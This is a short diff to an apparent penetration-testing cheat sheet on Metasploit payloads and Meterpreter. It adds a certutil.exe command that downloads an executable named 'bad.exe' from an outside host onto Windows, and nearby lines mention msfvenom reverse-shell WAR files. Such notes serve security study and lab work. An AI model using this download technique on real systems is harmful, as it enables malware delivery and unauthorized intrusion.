@@ -92,6 +92,9 @@ Payloads other than msf:
 * `msfvenom`
   * for example, can create a reverse shell tomcat war file
 
+Download file to windows:
+`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
+
 ## Meterpreter etc
 `meterpreter > getuid`
 * NT AUTHORITY\SYSTEM - highest user on windows
